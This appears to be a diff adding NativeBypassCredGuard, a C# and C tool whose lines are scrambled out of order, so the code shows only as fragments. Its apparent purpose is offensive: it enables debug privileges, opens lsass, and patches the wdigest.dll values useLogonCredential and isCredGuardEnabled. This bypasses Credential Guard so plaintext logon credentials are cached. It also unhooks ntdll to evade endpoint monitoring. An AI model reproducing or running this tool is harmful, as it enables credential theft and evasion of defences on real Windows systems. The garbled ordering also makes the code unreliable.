@@ -1,0 +1,1600 @@
+    
+        
+                    
+                        
+                                count
+                                isCredGuardEnabled = (buffer[j 
+                                matchedBytes[count] = buffer[k]
+                                useLogonCredential = (buffer[j 
+                            // Extract values
+                            RemapNtdll(debug)
+                            for (int k = j
+                            if (j 
+                            int count = 0
+                            offset = j 
+                            return true
+                            {
+                            }
+                        if ((l 
+                        if (buffer[j] == 0x39 
+                        matchedBytes[count
+                        {
+                        }
+                    // Extract values
+                    // NtWriteProcessMemory -> Write values
+                    // Search for pattern
+                    Attributes = 0x00000002
+                    Console.WriteLine()
+                    Environment.Exit(-1)
+                    IntPtr.Zero
+                    NtClose(fileHandle)
+                    NtClose(tokenHandle)
+                    break
+                    buffer[j 
+                    for (int j = (int)rawDataPointer
+                    for (int l = 0
+                    for (uint32_t k = j
+                    help()
+                    if (args.Length == 2)
+                    if (debug 
+                    if (debug) {
+                    if (j 
+                    int count = 0
+                    return
+                    return aux_handle
+                    return dll_base
+                    return false
+                    return true
+                    uint isCredGuardEnabled_Value = 0
+                    uint useLogonCredential_Value = 1
+                    {
+                    }
+                )
+                // Compare with DLL name we are searching
+                // Get DLL base address
+                // Get offsets
+                // NtCreateFile -> Get file handle
+                // NtGetNextProcess 
+                // NtOpenProcessToken 
+                // NtQueryInformationProcess -> wdigest.dll address in lsass
+                // NtReadFile -> Read DLL bytes
+                // NtReadVirtualMemory -> Read values again
+                Buffer.MemoryCopy((void
+                Environment.Exit(0)
+                IntPtr currentProcess = (IntPtr)(-1)
+                IntPtr isCredGuardEnabled_Address = hModule 
+                IntPtr lsassHandle = GetProcessByName(proc_name)
+                IntPtr useLogonCredential_Address = hModule 
+                TOKEN_PRIVILEGES tokenPrivileges = new TOKEN_PRIVILEGES
+                WORD ordinal = 0
+                bool privilege_bool = EnableDebugPrivileges(currentProcess)
+                byte[] fileBytes = ReadDLL(fileHandle)
+                default:
+                else
+                else {
+                help()
+                if (!parse_bool)
+                if (buff[i] == 0 
+                if (buffer[j] == 0x39 
+                if (bytesReadProcess == 4)
+                if (current_proc_name == proc_name)
+                if (debug 
+                if (debug)
+                if (dll_name.ToLower() == base_dll_name.ToLower())
+                if (fileHandle != IntPtr.Zero 
+                if (j 
+                if (lsassHandle == IntPtr.Zero)
+                if (ntstatus != 0)
+                if (openfile_bool 
+                if (privilege_bool 
+                if (tokenHandle != IntPtr.Zero)
+                int sectionOffset = sectionHeadersOffset 
+                next_flink = next_flink - 0x10
+                out bytesWritten
+                pNtdllBuffer = (IntPtr)p
+                pbi_addr = (IntPtr)p
+                return
+                return (BYTE
+                return false
+                string current_proc_name = GetProcNameFromHandle(aux_handle).ToLower()
+                uintptr_t maskedFunctionAddress = (uintptr_t)functionAddress 
+                unicode_str 
+                void
+                {
+                }
+               0)
+               FILE_READ_DATA  
+            )
+            // BaseOfCode
+            // Check MZ Signature
+            // Check Optional Headers Magic field value
+            // Check PE Signature
+            // Copy from one address to the other
+            // Create a PROCESS_BASIC_INFORMATION structure in the byte array
+            // Create byte array with the size of the PROCESS_BASIC_INFORMATION structure
+            // Create debugged process
+            // CreateProcess in DEBUG mode
+            // Get Ldr 
+            // Get PEB Base Address
+            // Get PEB->ProcessParameters
+            // Get ProcessParameters->CommandLine
+            // Get pointer to the buffer containing ntdll.dll
+            // If 32-bit process these offsets change
+            // Initialize UNICODE_STRING
+            // IntPtr fileHandle
+            // Local DLL info
+            // NtReadVirtualMemory to copy the bytes from ntdll.dll in the suspended process into a new buffer (ntdllBuffer)
+            // Ntdll .Text Section Address and Size from local process
+            // PE header location
+            // Replace DLL
+            // Search for pattern
+            // Set up OBJECT_ATTRIBUTES
+            // SizeOfCode
+            // Terminate and close handles in debug process
+            // VirtualProtect back to PAGE_EXECUTE_READ
+            // VirtualProtect to PAGE_EXECUTE_WRITECOPY
+            // debugged_process ntdll_handle = local ntdll_handle --> debugged_process .text section ntdll_handle = local .text section ntdll_handle
+            DWORD functionAddressVRA = 0
+            IO_STATUS_BLOCK ioStatusBlock = new IO_STATUS_BLOCK()
+            IntPtr InInitializationOrderModuleList = ldr_adress 
+            IntPtr aux_handle = IntPtr.Zero
+            IntPtr baseofcode_addr = optional_headers_addr 
+            IntPtr commandline_pointer = processparameters_adress 
+            IntPtr currentProcess = (IntPtr)(-1)
+            IntPtr dll_base = (IntPtr)1337
+            IntPtr e_lfanew_addr = ntdl_address 
+            IntPtr fileHandle = IntPtr.Zero
+            IntPtr hProcess = System.Diagnostics.Process.GetCurrentProcess().Handle
+            IntPtr image_nt_headers_addr = ntdl_address 
+            IntPtr ldr_pointer = pebaddress 
+            IntPtr localNtdllTxt = localNtdllHandle 
+            IntPtr optional_headers_addr = image_nt_headers_addr 
+            IntPtr pNtdllBuffer = IntPtr.Zero
+            IntPtr pbi_addr = IntPtr.Zero
+            IntPtr peb_pointer = pbi_addr 
+            IntPtr pebaddress = Marshal.ReadIntPtr(peb_pointer)
+            IntPtr processparameters_pointer = pebaddress 
+            IntPtr signature_addr = ntdl_address
+            IntPtr sizeofcode_addr = optional_headers_addr 
+            IntPtr tokenHandle = IntPtr.Zero
+            IntPtr unhookedNtdllTxt = GetNtdllFromDebugProc(process_path)
+            LARGE_INTEGER byteOffset = new LARGE_INTEGER { QuadPart = 0 }
+            OBJECT_ATTRIBUTES objectAttributes = new OBJECT_ATTRIBUTES()
+            PROCESS_INFORMATION pi = new PROCESS_INFORMATION()
+            RemapNtdll(debug)
+            STARTUPINFO si = new STARTUPINFO()
+            UNICODE_STRING unicodeString = new UNICODE_STRING()
+            addressOfNameOrdinalsRA = (BYTE
+            addressOfNamesRA = (BYTE
+            bool debug = true
+            bool debugstop_res = DebugActiveProcessStop(pi.dwProcessId)
+            break
+            buffer = new byte[4]
+            byte[] buff = new byte[256]
+            byte[] buff = new byte[8]
+            byte[] data = new byte[2]
+            byte[] fileBytes = new byte[1024 
+            byte[] ntdllBuffer = new byte[localNtdllTxtSize]
+            byte[] pbi_byte_array = new byte[process_basic_information_size]
+            catch (Exception ex)
+            char functionName[256]
+            data = new byte[2]
+            data = new byte[4]
+            finally
+            fixed (byte
+            for (int i = 0
+            for (uint32_t j = rawDataPointer
+            if (!Environment.Is64BitProcess)
+            if (!createprocess_res)
+            if (args.Length == 0)
+            if (closehandle_proc != 0 
+            if (debug)
+            if (debugstop_res != true)
+            if (ldr_adress == IntPtr.Zero)
+            if (ntstatus != 0 
+            if (optional_header_magic != 0x20B 
+            if (peSignature != 0x00004550)
+            if (readprocmem_res != 0)
+            if (status != 0 
+            if (status != 0)
+            if (terminateproc_res != 0)
+            if (vp_res != 0)
+            if (vp_res2 != 0)
+            int MAXIMUM_ALLOWED = 0x02000000
+            int commandline_offset = 0x68
+            int flink_buffer_offset = 0x50
+            int flink_dllbase_offset = 0x20
+            int inInitializationOrderModuleList_offset = 0x30
+            int ldr_offset = 0x18
+            int localNtdllTxtBase = result[0]
+            int localNtdllTxtSize = result[1]
+            int peb_offset = 0x8
+            int processparameters_offset = 0x20
+            int sectionHeadersOffset = peHeaderOffset 
+            int[] result = GetTextSectionInfo(localNtdllHandle)
+            isCredGuardEnabled = 0
+            matchedBytes = new byte[18]
+            objectAttributes.Attributes = OBJ_CASE_INSENSITIVE
+            objectAttributes.Length = Marshal.SizeOf<OBJECT_ATTRIBUTES>()
+            objectAttributes.ObjectName = Marshal.AllocHGlobal(Marshal.SizeOf<UNICODE_STRING>())
+            objectAttributes.RootDirectory = IntPtr.Zero
+            objectAttributes.SecurityDescriptor = IntPtr.Zero
+            objectAttributes.SecurityQualityOfService = IntPtr.Zero
+            offset = 0
+            return (IntPtr)value
+            return IntPtr.Zero
+            return aux_handle
+            return commandline_value
+            return dll_base
+            return false
+            return fileBytes
+            return pNtdllBuffer
+            return result
+            return true
+            return unicode_str
+            si.cb = System.Runtime.InteropServices.Marshal.SizeOf(si)
+            string firstArg = args[0].ToLower()
+            string signature_dos_header = System.Text.Encoding.Default.GetString(data)
+            string signature_nt_header = System.Text.Encoding.Default.GetString(data)
+            switch (firstArg)
+            try
+            uint bytesReadProcess
+            uint bytesWritten
+            uint closehandle_proc = NtClose(pi.hProcess)
+            uint closehandle_thread = NtClose(pi.hThread)
+            uint dwOldProtection
+            uint localNtdllTxtSizeUint = (uint)localNtdllTxtSize
+            uint ntstatus = NtWriteVirtualMemory(
+            uint process_basic_information_size = 48
+            uint status = NtCreateFile(
+            uint status = NtReadFile(
+            uint32_t rawDataPointer = 
+            uint32_t rawDataSize = 
+            uint32_t virtualAddress = 
+            unicodeString.Buffer = Marshal.StringToHGlobalUni(filePath)
+            unicodeString.Length = (ushort)(filePath.Length 
+            unicodeString.MaximumLength = (ushort)((filePath.Length 
+            unsafe
+            useLogonCredential = 0
+            void
+            while (dll_base != IntPtr.Zero)
+            {
+            }
+        // Overwrite hooked ntdll .text section with a clean version
+        // Read AddressOfFunctions: ExportTable(IMAGE_EXPORT_DIRECTORY)->AddressOfFunctions
+        // Read AddressOfNameOrdinals: ExportTable(IMAGE_EXPORT_DIRECTORY)->AddressOfNameOrdinals
+        // Read AddressOfNames: ExportTable(IMAGE_EXPORT_DIRECTORY)->AddressOfNames
+        // Read NumberOfNames: ExportTable(IMAGE_EXPORT_DIRECTORY)->NumberOfNames
+        // Write
+        0
+        1024 
+        DWORD addressOfFunctionsVRA_value = 0
+        DWORD addressOfNameOrdinalsVRA_value = 0
+        DWORD addressOfNamesVRA_value = 0
+        DWORD numberOfNames_value = 0
+        ExitProcess(0)
+        FILE_READ_DATA 
+        NULL
+        NtClose(fileHandle)
+        NtClose(tokenHandle)
+        [StructLayout(LayoutKind.Explicit)] public struct LARGE_INTEGER { [FieldOffset(0)] public long QuadPart
+        [StructLayout(LayoutKind.Sequential)] public struct IO_STATUS_BLOCK { public IntPtr Status
+        [StructLayout(LayoutKind.Sequential)] public struct LUID { public uint LowPart
+        [StructLayout(LayoutKind.Sequential)] public struct OBJECT_ATTRIBUTES { public int Length
+        [StructLayout(LayoutKind.Sequential)] public struct PROCESS_INFORMATION { public IntPtr hProcess
+        [StructLayout(LayoutKind.Sequential)] public struct STARTUPINFO { public int cb
+        [StructLayout(LayoutKind.Sequential)] public struct TOKEN_PRIVILEGES { public uint PrivilegeCount
+        [StructLayout(LayoutKind.Sequential)] public struct UNICODE_STRING { public ushort Length
+        char
+        char sectionName[9]
+        exit(-1)
+        exit(0)
+        for (int i = 0
+        free(fileBytes)
+        help()
+        if (argc == 3 
+        if (buff[i] == 0 
+        if (current_proc_name 
+        if (debug 
+        int sectionOffset = sectionHeadersOffset 
+        next_flink = (void
+        public const uint DEBUG_PROCESS = 0x00000001
+        public const uint FILE_OPEN = 0x00000001
+        public const uint FILE_READ_ATTRIBUTES = 0x8
+        public const uint FILE_READ_DATA = 0x1
+        public const uint FILE_SHARE_READ = 0x00000001
+        public const uint OBJ_CASE_INSENSITIVE = 0x00000040
+        public const uint PAGE_EXECUTE_WRITECOPY = 0x80
+        public const uint TOKEN_ADJUST_PRIVILEGES = 0x00000020
+        public const uint TOKEN_QUERY = 0x00000008
+        public static IntPtr GetProcessByName(string proc_name)
+        public static int[] GetTextSectionInfo(IntPtr ntdl_address)
+        public unsafe static IntPtr GetNtdllFromDebugProc(string process_path)
+        return
+        return 0
+        return 1
+        return NULL
+        return false
+        return true
+        sectionName[8] = '
+        static bool EnableDebugPrivileges(IntPtr currentProcess)
+        static byte[] ReadDLL(IntPtr fileHandle)
+        static void Main(string[] args)
+        static void RemapNtdll(bool debug)
+        static void help()
+        str
+        to_lowercase(current_proc_name)
+        uint32_t isCredGuardEnabled_Value = 0
+        uint32_t useLogonCredential_Value = 1
+        unicode_str[str_index
+        unsafe static string GetProcNameFromHandle(IntPtr process_handle)
+        void
+        wchar_t wch = 
+        {
+        }
+      <Configuration>Debug</Configuration>
+      <Configuration>Release</Configuration>
+      <ConformanceMode>true</ConformanceMode>
+      <EnableCOMDATFolding>true</EnableCOMDATFolding>
+      <Extensions>cpp
+      <Extensions>h
+      <Extensions>rc
+      <Filter>Source Files</Filter>
+      <FunctionLevelLinking>true</FunctionLevelLinking>
+      <GenerateDebugInformation>true</GenerateDebugInformation>
+      <IntrinsicFunctions>true</IntrinsicFunctions>
+      <OptimizeReferences>true</OptimizeReferences>
+      <Platform>Win32</Platform>
+      <Platform>x64</Platform>
+      <PreprocessorDefinitions>NDEBUG
+      <PreprocessorDefinitions>WIN32
+      <PreprocessorDefinitions>_DEBUG
+      <SDLCheck>true</SDLCheck>
+      <SubSystem>Console</SubSystem>
+      <UniqueIdentifier>{4FC737F1-C7A5-4376-A066-2A32D752A2FF}</UniqueIdentifier>
+      <UniqueIdentifier>{67DA6AB6-F800-4c08-8B7A-83BB121AAD01}</UniqueIdentifier>
+      <UniqueIdentifier>{93995380-89BD-4b04-88EB-625FBE52EBFB}</UniqueIdentifier>
+      <WarningLevel>Level3</WarningLevel>
+    )
+    // Call NtReadFile
+    // Call NtReadVirtualMemory
+    // Check MZ Signature (2 bytes)
+    // Check Optional Headers Magic field value (2 bytes)
+    // Check PE Signature (2 bytes)
+    // Check if the read was successful and all bytes were read
+    // Check status: 0x103 (STATUS_PENDING) is allowed
+    // Close the handle
+    // DOS header (IMAGE_DOS_HEADER)->e_lfanew
+    // Get PEB Base Address
+    // Get PEB->ProcessParameters
+    // Get ProcessParameters->CommandLine
+    // Initialize UNICODE_STRING
+    // NT Header (IMAGE_NT_HEADERS)->FileHeader(IMAGE_FILE_HEADER)->SizeOfOptionalHeader
+    // Open file
+    // Open the process token
+    // Optional Header(IMAGE_OPTIONAL_HEADER64)->DataDirectory(IMAGE_DATA_DIRECTORY)[0]->VirtualAddress
+    // Other option is LoadLibrary: much simpler but there is not an equivalent in ntdll :(
+    // PE header location
+    // Parse PE File
+    // Query process information
+    // Read
+    // Read BaseOfCode (4 bytes)
+    // Read SizeOfCode (4 bytes)
+    // Read bytes
+    // Read e_lfanew (4 bytes) at offset 0x3C
+    // Return BaseOfCode and SizeOfCode as an array
+    // Set the privilege
+    // Set up OBJECT_ATTRIBUTES
+    // VirtualProtect back to the original protection
+    //getchar()
+    </ClCompile>
+    </Filter>
+    </Link>
+    </ProjectConfiguration>
+    </startup>
+    <AllowUnsafeBlocks>true</AllowUnsafeBlocks>
+    <AssemblyName>NativeBypassCredGuard_C
+    <AutoGenerateBindingRedirects>true</AutoGenerateBindingRedirects>
+    <CharacterSet>Unicode</CharacterSet>
+    <ClCompile>
+    <ConfigurationType>Application</ConfigurationType>
+    <DebugSymbols>true</DebugSymbols>
+    <DebugType>full</DebugType>
+    <DebugType>pdbonly</DebugType>
+    <DefineConstants>DEBUG
+    <DefineConstants>TRACE</DefineConstants>
+    <Deterministic>true</Deterministic>
+    <ErrorReport>prompt</ErrorReport>
+    <FileAlignment>512</FileAlignment>
+    <Keyword>Win32Proj</Keyword>
+    <LangVersion>7.3</LangVersion>
+    <Link>
+    <Optimize>false</Optimize>
+    <Optimize>true</Optimize>
+    <OutputPath>bin
+    <OutputType>Exe</OutputType>
+    <PlatformTarget>AnyCPU</PlatformTarget>
+    <PlatformTarget>x64</PlatformTarget>
+    <PlatformToolset>v143</PlatformToolset>
+    <Prefer32Bit>true</Prefer32Bit>
+    <ProjectGuid>{E383DFEA-EC22-4667-9434-3F2591A03740}</ProjectGuid>
+    <ProjectGuid>{c4d31433-5017-4b5e-956b-8a540520986c}</ProjectGuid>
+    <ProjectName>NativeBypassCredGuard_C
+    <RootNamespace>C</RootNamespace>
+    <RootNamespace>C_</RootNamespace>
+    <TargetFrameworkVersion>v4.7.2</TargetFrameworkVersion>
+    <UseDebugLibraries>false</UseDebugLibraries>
+    <UseDebugLibraries>true</UseDebugLibraries>
+    <VCProjectVersion>17.0</VCProjectVersion>
+    <WarningLevel>4</WarningLevel>
+    <WholeProgramOptimization>true</WholeProgramOptimization>
+    <WindowsTargetPlatformVersion>10.0</WindowsTargetPlatformVersion>
+    <startup> 
+    BOOL createprocess_res = CreateProcessA(
+    BOOL debugstop_res = DebugActiveProcessStop(pi.dwProcessId)
+    BYTE
+    BYTE buff[16]
+    BYTE buff[256]
+    BYTE buff[8]
+    BYTE isCredGuardEnabled_buffer[4] = { 0 }
+    BYTE matchedBytes[18] = { 0 }
+    BYTE pbi_byte_array[48]
+    BYTE signature_dos_header[2]
+    BYTE signature_nt_header[2]
+    BYTE useLogonCredential_buffer[4] = { 0 }
+    DWORD baseofcode
+    DWORD e_lfanew
+    DWORD e_lfanew_value = 0
+    DWORD exportTableRVA_value = 0
+    DWORD sizeofcode
+    HANDLE aux_handle = NULL
+    HANDLE currentProcess = (HANDLE)(-1)
+    HANDLE currentProcess = (HANDLE)-1
+    HANDLE fileHandle
+    HANDLE hProcess = (HANDLE)-1
+    HANDLE lsassHandle = GetProcessByName(proc_name)
+    HANDLE tokenHandle = NULL
+    IO_STATUS_BLOCK ioStatusBlock
+    IO_STATUS_BLOCK ioStatusBlock = { 0 }
+    LARGE_INTEGER byteOffset = { 0 }
+    LPVOID localNtdllTxt = (LPVOID)((DWORD_PTR)localNtdllHandle 
+    LPVOID pNtdllBuffer = (LPVOID)ntdllBuffer
+    NTSTATUS closehandle_proc = NtClose(pi.hProcess)
+    NTSTATUS closehandle_thread = NtClose(pi.hThread)
+    NTSTATUS ntstatus
+    NTSTATUS readprocmem_res = NtReadVirtualMemory(
+    NTSTATUS status
+    NTSTATUS status = NtCreateFile(
+    OBJECT_ATTRIBUTES objectAttributes
+    PROCESS_INFORMATION pi = { 0 }
+    PVOID commandline_pointer = (PVOID)((BYTE
+    PVOID peb_pointer = (PVOID)((BYTE
+    PVOID pebaddress = 
+    PVOID processparameters_pointer = (PVOID)((BYTE
+    SIZE_T aux = 0
+    SIZE_T aux = localNtdllTxtSize
+    SIZE_T bytesRead
+    SIZE_T bytesRead = 0
+    STARTUPINFOA si = { 0 }
+    TOKEN_PRIVILEGES_STRUCT tokenPrivileges
+    ULONG ReturnLength
+    ULONG bytesWritten
+    ULONG dwOldProtection
+    ULONG returnLength
+    UNICODE_STRING unicodeString
+    WORD optional_header_magic
+    WORD sizeopthdr_value = 0
+    bool debug = true
+    bool privilege_bool = EnableDebugPrivileges()
+    char
+    const char
+    const int commandline_offset = 0x68
+    const int peb_offset = 0x8
+    const int process_basic_information_size = 48
+    const int processparameters_offset = 0x20
+    else {
+    for (char
+    for (int i = 0
+    free(fileBuffer)
+    if (!createprocess_res) {
+    if (!debugstop_res 
+    if (!fileBytes) {
+    if (!is64BitProcess()) {
+    if (!parse_bool) {
+    if ((long long)ldr_adress == 0) {
+    if (argc < 2) {
+    if (closehandle_proc != 0 
+    if (debug 
+    if (debug) {
+    if (exportTableRVA_value != 0) {
+    if (fileBuffer == NULL) {
+    if (fileHandle != NULL) {
+    if (lsassHandle == 0) {
+    if (ntstatus != 0 
+    if (ntstatus != 0) {
+    if (ntstatus == 0 
+    if (optional_header_magic != 0x20B 
+    if (peSignature != 0x00004550) {
+    if (readprocmem_res != 0) {
+    if (signature_dos_header[0] != 'M' 
+    if (signature_nt_header[0] != 'P' 
+    if (status != 0 
+    if (status != 0) {
+    if (tokenHandle != NULL) {
+    if (vp_res != 0) {
+    if (vp_res_2 != 0) {
+    initializeFunctions()
+    int
+    int exportrva_offset = 136
+    int flink_buffer_fulldllname_offset = 0x40
+    int flink_buffer_offset = 0x50
+    int flink_dllbase_offset = 0x20
+    int inInitializationOrderModuleList_offset = 0x30
+    int isCredGuardEnabled = 0
+    int isCredGuardEnabled_Offset = isCredGuardEnabled 
+    int ldr_offset = 0x18
+    int localNtdllTxtBase = result[0]
+    int localNtdllTxtBase = textSectionInfo[0]
+    int localNtdllTxtSize = result[1]
+    int localNtdllTxtSize = textSectionInfo[1]
+    int offset = 0
+    int peHeaderOffset = 
+    int peb_offset = 0x8
+    int process_basic_information_size = 48
+    int sectionHeadersOffset = peHeaderOffset 
+    int str_index = 0
+    int useLogonCredential = 0
+    int useLogonCredential_Offset = useLogonCredential 
+    internal class NT
+    internal class Program
+    long long localNtdllTxt = (long long)localNtdllHandle 
+    long long unhookedNtdllTxt = (long long)MapNtdllFromDebugProc(proc_path)
+    long long value = 
+    ntstatus = NtWriteVirtualMemory(
+    objectAttributes.Attributes = OBJ_CASE_INSENSITIVE
+    objectAttributes.Length = sizeof(OBJECT_ATTRIBUTES)
+    objectAttributes.ObjectName = 
+    objectAttributes.RootDirectory = NULL
+    objectAttributes.SecurityDescriptor = NULL
+    objectAttributes.SecurityQualityOfService = NULL
+    pbi_addr = (void
+    result[0] = baseofcode
+    result[1] = sizeofcode
+    return
+    return (PVOID)value
+    return 0
+    return NULL
+    return commandline_value
+    return false
+    return fileBytes
+    return pNtdllBuffer
+    return result
+    return true
+    return unicode_str
+    return value
+    si.cb = sizeof(STARTUPINFOA)
+    static char unicode_str[128]
+    static int result[2]
+    status = NtReadFile(
+    tokenPrivileges.Attributes = 0x00000002
+    tokenPrivileges.Luid.HighPart = 0
+    tokenPrivileges.Luid.LowPart = 20
+    tokenPrivileges.PrivilegeCount = 1
+    uint16_t numberOfSections = 
+    uint16_t sizeOfOptionalHeader = 
+    uint32_t peSignature = 
+    uintptr_t dll_base = (uintptr_t)1337
+    uintptr_t isCredGuardEnabled_Address = hModule 
+    uintptr_t useLogonCredential_Address = hModule 
+    uintptr_t value = 
+    unicodeString.Buffer = (PWSTR)filePath
+    unicodeString.Length = (USHORT)(wcslen(filePath) 
+    unicodeString.MaximumLength = (USHORT)((wcslen(filePath) 
+    unicode_str[str_index] = '
+    unsigned char pbi_byte_array[process_basic_information_size]
+    void
+    while (
+    while (dll_base != NULL) {
+    {
+    }
+  // Convert each character to lowercase
+  6)
+  </ImportGroup>
+  </ItemDefinitionGroup>
+  </ItemGroup>
+  </PropertyGroup>
+  <ItemGroup>
+  <PropertyGroup />
+  <PropertyGroup>
+ (DWORD_PTR)maskedFunctionAddress
+ (buffer[j 
+ (i 
+ (int)virtualAddress - (int)rawDataPointer
+ (isCredGuardEnabled 
+ (optional):
+ (or omitted): Do not remap the ntdll library
+ (required):
+ (terminateproc_res != 0)) {
+ (to 0).
+ (to 1) and 
+ (useLogonCredential 
+ // 1 MB
+ // Convert to lowercase
+ // Each section header is 40 bytes
+ // Marshal.SizeOf(typeof(UInt32)) 
+ // Null-terminate
+ // Return the buffer
+ // Uint16 (2 bytes) 
+ 00 8b 
+ 0x%X)
+ 0x10))
+ 0x3C
+ 0x3C)
+ 0xFFFFFFFF
+ 0x{(isCredGuardEnabled 
+ 0x{(useLogonCredential 
+ 1) 
+ 1024)
+ 1024]
+ 10] << 16) 
+ 11 >= bufferSize) break
+ 11] == 0x00)
+ 11] == 0x00) {
+ 12)
+ 12):X6} (0x{isCredGuardEnabled:X6} 
+ 16)
+ 18 
+ 1] == 0) {
+ 1] == 0) { break
+ 2 Byte (1 byte) 
+ 20)
+ 24 
+ 3] << 8) 
+ 4 Uint32 (4 byte) - public UInt16 Magic
+ 40)
+ 4] << 16) 
+ 5 < buffer.Length)
+ 5 < bufferSize) {
+ 5] == 0x00 
+ 6):X6} (0x{useLogonCredential:X6} 
+ 6] == 0x8b 
+ 9] << 8) 
+ Byte (1 byte) 
+ CustomGetProcAddress(void
+ DWORD Attributes
+ Examples
+ GetProcNameFromHandle(HANDLE process_handle) {
+ GetTextSectionInfo(LPVOID ntdll_address) {
+ HANDLE RootDirectory
+ InInitializationOrderModuleList = (void
+ LUID Luid
+ Marshal.SizeOf(typeof(IMAGE_FILE_HEADER)) = 24
+ NativeBypassCredGuard
+ Notes
+ NtAdjustPrivilegesToken -> Enable SeDebugPrivilege privilege
+ NtCloseFn)(HANDLE)
+ NtQueryInformationProcess -> Get lsass process handle 
+ Offset 
+ PIO_STATUS_BLOCK
+ POBJECT_ATTRIBUTES
+ PTOKEN_PRIVILEGES_STRUCT
+ PUNICODE_STRING
+ PUNICODE_STRING ObjectName
+ PVOID Pointer
+ PVOID SecurityDescriptor
+ PVOID SecurityQualityOfService
+ PWSTR Buffer
+ ReadDLL(HANDLE fileHandle) {
+ References
+ ULONG Attributes
+ ULONG_PTR Information
+ USHORT MaximumLength
+ Usage
+ Visual Studio Version 17
+ addressOfFunctionsRA = (BYTE
+ addressOfFunctionsVRA_value
+ addressOfNameOrdinalsRA = (BYTE
+ addressOfNameOrdinalsVRA_value
+ addressOfNamesRA = (BYTE
+ addressOfNamesVRA_value
+ and C
+ argv[]) {
+ buff[i 
+ buffer[j 
+ bytesRead != 2) {
+ bytesRead != 4) {
+ bytesRead == bufferLength) {
+ bytesWritten != sizeof(uint))
+ bytesWritten != sizeof(uint32_t)) {
+ closehandle_thread != 0)
+ closehandle_thread != 0) {
+ commandline_offset
+ commandline_offset)
+ current_proc_name = GetProcNameFromHandle(aux_handle)
+ debug)
+ dllName
+ dll_name) {
+ e_lfanew
+ e_lfanew 
+ e_lfanew_value 
+ exportTableRVA_value 
+ fileBuffer = ReadDLL(fileHandle)
+ fileBytes = (BYTE
+ fileHandle) {
+ fileHandle.ToInt64() != -1)
+ firstArg = argv[1]
+ flink_buffer_offset))
+ flink_dllbase_offset))
+ func_name) {
+ functionAddress
+ functionAddressRA = (BYTE
+ functionAddressVRA
+ hProcess != IntPtr.Zero)
+ hProcess != NULL) {
+ i < (int)numberOfNames_value
+ i < 18
+ i < buff.Length - 1
+ i < numberOfSections
+ i < sizeof(buff) - 1
+ inInitializationOrderModuleList_offset
+ inInitializationOrderModuleList_offset)
+ isCredGuardEnabled_Offset
+ j < rawDataPointer 
+ k < buffer.Length
+ k < bufferSize
+ k < j 
+ l < 18
+ ldr_offset
+ ldr_offset)
+ ldr_pointer = (void
+ localNtdllTxtBase
+ localNtdllTxtBase)
+ localNtdllTxtSize 
+ matchedBytes) {
+ ntdll remapping):
+ ntdllBuffer = (BYTE
+ ntstatus != 0x8000000D 
+ ntstatus != 0xC0000005 
+ offset 
+ openfile_bool) {
+ optional_header_magic != 0x10B)
+ optional_header_magic != 0x10B) {
+ ordinal 
+ p = firstArg
+ p = ntdllBuffer)
+ p = pbi_byte_array)
+ pbi_addr = (void
+ pbi_addr = NULL
+ peHeaderOffset 
+ peHeaderOffset)
+ peb_offset
+ peb_offset)
+ peb_pointer = (void
+ pebaddress = 
+ privilege_bool) {
+ proc_name) {
+ processparameters_offset
+ processparameters_offset)
+ public Byte MajorLinkerVersion
+ public Byte MinorLinkerVersion
+ public IntPtr Buffer
+ public IntPtr ObjectName
+ public IntPtr RootDirectory
+ public IntPtr SecurityDescriptor
+ public IntPtr SecurityQualityOfService
+ public IntPtr hStdError
+ public IntPtr hStdInput
+ public IntPtr hStdOutput
+ public IntPtr hThread
+ public IntPtr lpDesktop
+ public IntPtr lpReserved
+ public IntPtr lpReserved2
+ public IntPtr lpTitle
+ public LUID Luid
+ public UInt32 AddressOfEntryPoint
+ public UInt32 BaseOfCode
+ public UInt32 SizeOfCode
+ public UInt32 SizeOfInitializedData
+ public UInt32 SizeOfUninitializedData
+ public int HighPart
+ public int dwFillAttribute
+ public int dwFlags
+ public int dwProcessId
+ public int dwThreadId
+ public int dwX
+ public int dwXCountChars
+ public int dwXSize
+ public int dwY
+ public int dwYCountChars
+ public int dwYSize
+ public short cbReserved2
+ public short wShowWindow
+ public uint Attributes
+ public ulong Information
+ public ushort MaximumLength
+ rawDataSize - 11
+ readval_icge_bool)
+ readval_ulcr_bool)
+ result = GetTextSectionInfo((void
+ sectionOffset 
+ setval_bool)
+ signature_dos_header[1] != 'Z') {
+ signature_nt_header[1] != 'E') {
+ sizeOfOptionalHeader
+ sizeof(wchar_t))
+ status != 0x103)
+ status != 0x103) {
+ str) {
+ textSectionInfo = GetTextSectionInfo((void
+ useLogonCredential_Offset
+ virtualAddress - rawDataPointer
+ } LargePointer
+![img1](https://raw.githubusercontent.com/ricardojoserf/ricardojoserf.github.io/master/images/nativebypasscredguard/Screenshot_1.png)
+![img2](https://raw.githubusercontent.com/ricardojoserf/ricardojoserf.github.io/master/images/nativebypasscredguard/Screenshot_2.png)
+![poc](https://raw.githubusercontent.com/ricardojoserf/ricardojoserf.github.io/master/images/nativebypasscredguard/esquema.png)
+"                        Console.Write($""{matchedBytes[l]:X2} "")"
+"                        Console.WriteLine($""["
+"                        if (args[1].ToLower() == ""true"")"
+"                    (uint)fileBytes.Length,"
+"                    Console.Write($""["
+"                    Console.WriteLine(""Pattern not found."")"
+"                    Console.WriteLine(""["
+"                    Console.WriteLine(""[-] Error calling NtAdjustPrivilegesToken. NTSTATUS: 0x"" "
+"                    Console.WriteLine(""[-] Error calling NtOpenProcessToken. NTSTATUS: 0x"" "
+"                    Console.WriteLine(""[-] Error calling NtQueryInformationProcess. NTSTATUS: 0x"" "
+"                    Console.WriteLine(""[-] It was not possible to get lsass handle."")"
+"                    Console.WriteLine($""["
+"                    IntPtr.Zero,"
+"                    Luid = new LUID { LowPart = 20, HighPart = 0 }, // LookupPrivilegeValue(null, ""SeDebugPrivilege"", ref luid)"
+"                    PrivilegeCount = 1,"
+"                    bool setval_bool = SetValue(lsassHandle, useLogonCredential_Address, useLogonCredential_Value)"
+"                    exec(""check"", debug)"
+"                    exec(""patch"", debug)"
+"                    fileBytes,"
+"                    fileHandle,"
+"                    ref byteOffset, //IntPtr.Zero,"
+"                    ref ioStatusBlock,"
+"                    setval_bool = SetValue(lsassHandle, isCredGuardEnabled_Address, isCredGuardEnabled_Value)"
+"                    uint rawDataPointer = BitConverter.ToUInt32(buffer, sectionOffset "
+"                    uint rawDataSize = BitConverter.ToUInt32(buffer, sectionOffset "
+"                    uint virtualAddress = BitConverter.ToUInt32(buffer, sectionOffset "
+"                // Console.WriteLine(""["
+"                Console.WriteLine(""Not a valid PE file."")"
+"                Console.WriteLine(""["
